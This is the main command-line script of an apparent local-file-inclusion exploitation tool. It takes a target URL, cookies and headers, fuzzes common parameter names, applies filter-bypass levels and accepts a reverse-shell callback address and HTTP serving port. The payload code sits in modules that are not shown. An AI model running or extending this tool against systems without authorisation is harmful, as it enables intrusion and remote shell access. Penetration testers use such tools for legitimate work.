#! /usr/bin/env python

import argparse
import atexit
import os
import signal
import sys
import urllib.parse
from os.path import expanduser

from core.constants import MARKER
from core.filter_bypass import set_level
from core.log import set_global_verbose, err, info, success
from core.misc import get_date_time, dump
from core.mode import Mode, print_all_mode_usage
from core.models.req_input import InputRequest
from core.parse_utils import parse_request, validate_marker, parse_get_url, str_to_dict, parse_socket_address, \
    is_valid_url
from core.payload_data import core_get_common_param_names
from core.scan import Scan


def signal_handler(sig, frame):
    sys.exit(0)


# Parse -------------------------------------------------------------------------------- #
parser = argparse.ArgumentParser(description='lfi_scanner')
parser.add_argument('-u', '--url', type=str,
                    help=f'Target URL (format: "http://www.domain.com/lfi.php?file={MARKER}" or "http://www.domain.com/?file=util/{MARKER}")')
parser.add_argument('--data', type=str,
                    help=f'Data string to be sent through POST (format: "key1={MARKER};key2=val2"))')
parser.add_argument('--cookie', type=str,
                    help=f'HTTP Cookie header value (format: "key1={MARKER};key2=val2"))')
parser.add_argument('--header', type=str,
                    help=f'HTTP extra headers (format: "header1={MARKER};header2=val2"))')
parser.add_argument('--proxy', type=str,
                    help='Use a proxy to connect to the target URL')
parser.add_argument('-x', '--method', default="GET", type=str,
                    help='Specify HTTP method')
parser.add_argument('-v', '--verbose', help="Increase output verbosity",
                    action="store_true")
parser.add_argument('-p', '--param', help="Force select parameter which will be injected")
parser.add_argument('-r', metavar="file", help="Parse from file")
parser.add_argument('-a', '--address', metavar="IP:FORWARDED_PORT",
                    help="Address where reverse shell will connect back to")
parser.add_argument('-s', '--http', help="Port which will be used for serving http content")
parser.add_argument('--batch', action='store_true', help="Fully automatic mode")
parser.add_argument('--redirect', action='store_true', help="Follow redirects")
parser.add_argument('-D', '--output', help="Output Folder (default cwd)")
parser.add_argument('--module', nargs=argparse.REMAINDER, help="Attempt exploiting only specific module(s)",
                    choices=list(Mode))
parser.add_argument('--level', type=int, default=1, help="Filter Bypass level (1-3)")

# Get args ------------------------------------------------------------------------------ #

req_input = InputRequest()

args = parser.parse_args()

set_global_verbose(args.verbose)
set_level(args.level)

output: str = args.output

if output is None or not os.path.isabs(output):
    output = os.getcwd()

# req related args
input_url: str = args.url
input_data: str = args.data
input_cookies: str = args.cookie
input_headers: str = args.header
input_method: str = args.method
input_proxy: str = args.proxy
follow_redirects: bool = args.redirect

parse_file: str = args.r
param_force: str = args.param
input_local_address: str = args.address
input_http_port: int = args.http

input_module = args.module

# Mode -------------------------------------------------------------------------------- #
mode = None

if input_module is not None:

    if len(input_module) == 0:
        print_all_mode_usage()
    else:
        input_mode = input_module.pop(0)

        for item in Mode:
            if item.value == input_mode:
                mode = item
                break

        if not mode:
            err(f"Unknown module <'{input_mode}'>")
            print_all_mode_usage()

if not mode:
    mode = Mode.all

# Http Request ------------------------------------------------------------------------ #
if parse_file:

    if parse_file[0] == "~":
        parse_file = expanduser("~") + parse_file[1:]

    info(f"Parsing HTTP request from '{parse_file}' ")

    try:
        req_input = parse_request(parse_file)
    except Exception as e:
        err(f"There was an error parsing '{parse_file}':\n{str(e)}", exit=True)

    pass
elif input_url:
    # prefix scheme
    if input_url is not None:
        input_url = input_url.strip()
        if not input_url.startswith("http://") and not input_url.startswith("https://"):
            input_url = "http://" + input_url

    if input_proxy is not None:
        if not input_proxy.startswith("http://") and not input_proxy.startswith("https://"):
            input_proxy = "http://" + input_proxy

    if input_method is None:
        input_method = "GET"

    req_input.method = input_method.upper()

    parsed_url = urllib.parse.urlparse(input_url)

    req_input.host = parsed_url.netloc
    parsed_get_url = parse_get_url(input_url)
    req_input.url_script_path = parsed_get_url[0]

    req_input.params = parsed_get_url[1]

    req_input.cookies = str_to_dict(input_cookies)
    req_input.data = str_to_dict(input_data)
    req_input.extra_headers = str_to_dict(input_headers)
else:
    err("No Url given", exit=True)
# Get param ---------------------------------------------------------------------------- #

if not is_valid_url(req_input.url_script_path):
    err("Invalid Url given", exit=True)

if param_force:
    if param_force in req_input.params:
        req_input.params[param_force] = MARKER
    if param_force in req_input.data:
        req_input.data[param_force] = MARKER
    elif param_force in req_input.cookies:
        req_input.cookies[param_force] = MARKER
    elif param_force in req_input.extra_headers:
        req_input.extra_headers[param_force] = MARKER

# validate input
amount = validate_marker(req_input)

quick_guess = False

if amount != 1:

    amount_possible_injections = len(req_input.params) + len(req_input.data) + len(
        req_input.cookies)

    if amount_possible_injections == 0:
        # guess GET params
        info("Try guessing parameters")
        quick_guess = True

    elif amount_possible_injections == 1:
        if req_input.params:
            req_input.params[list(req_input.params.keys())[0]] = MARKER
        if req_input.data:
            req_input.data[list(req_input.data.keys())[0]] = MARKER
        elif req_input.cookies:
            req_input.cookies[list(req_input.cookies.keys())[0]] = MARKER
    else:
        err(f"I need exactly one marker <'{MARKER}'> to work with! Found {amount}", exit=True)

address = None
if input_local_address:
    address = parse_socket_address(input_local_address)

if __name__ == "__main__":
    # ignore any ssh cert warnings
    import urllib3

    urllib3.disable_warnings()

    import http.client

    http.client._MAXLINE = 1000000

    # dump(req_input)

    atexit.register(print, f"[*] scan ending @ {get_date_time()}")
    print(f"[*] scan starting @ {get_date_time()}")
    signal.signal(signal.SIGINT, signal_handler)

    if quick_guess:

        info("No param given, try fuzzing common parameters")

        for param in core_get_common_param_names():
            info(f"Try: '{param}'")
            req_input.params = {param: MARKER}
            scan = Scan(req_input, input_proxy, mode=mode, input_mode_params=input_module, address=address,
                        http_port=input_http_port,
                        follow_redirects=follow_redirects, output_dir=output)
            scan.quick_target_check(param_fuzzing=True)

            if scan.filter_bypass:
                success(f"Param: '{param}' is injectable")
                scan.start()
                break

    else:
        scan = Scan(req_input, input_proxy, mode=mode, input_mode_params=input_module, address=address,
                    http_port=input_http_port,
                    follow_redirects=follow_redirects, output_dir=output)
        scan.start()
